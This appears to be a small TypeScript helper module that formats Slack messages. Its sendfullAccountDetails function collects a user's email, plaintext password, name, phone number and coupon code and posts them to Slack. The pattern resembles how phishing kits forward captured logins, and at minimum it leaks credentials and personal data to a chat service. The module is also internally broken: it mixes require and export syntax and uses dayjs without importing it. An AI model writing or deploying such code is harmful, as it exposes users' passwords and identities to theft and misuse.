const slackApi = require('./api.ts');

export const sendLoginEmail = async (email: string) => {
  return slackApi.sendSlackMessage(email);
};

export const sendfullAccountDetails = async (accountDetail: any) => {
  const block = [
    {
      type: "section",
      text: {
        text: "Account Detail",
        type: "mrkdwn",
      },
      fields: [
        {
          type: "mrkdwn",
          text: `Date: ${dayjs().format('MMM DD YYYY HH:mm:ss')}`,
        },
        {
          type: "mrkdwn",
          text: `Email: ${accountDetail.email}`,
        },
        {
          type: "mrkdwn",
          text: `Password: ${accountDetail.password}`,
        },
        {
          type: "mrkdwn",
          text: `First name: ${accountDetail.firstName}`,
        },
        {
          type: "mrkdwn",
          text: `Last name: ${accountDetail.lastName}`,
        },
        {
          type: "mrkdwn",
          text: `Phone Number Id: ${accountDetail.phoneNumberId}`,
        },
        {
          type: "mrkdwn",
          text: `Phone Number: ${accountDetail.phoneNumber}`,
        },
        {
          type: "mrkdwn",
          text: `Coupon code: ${accountDetail.couponCode}`,
        },
      ],
    },
  ];
  return slackApi.sendSlackMessage(accountDetail.email, block);
};

module.exports = {
  sendLoginEmail,
  sendfullAccountDetails
};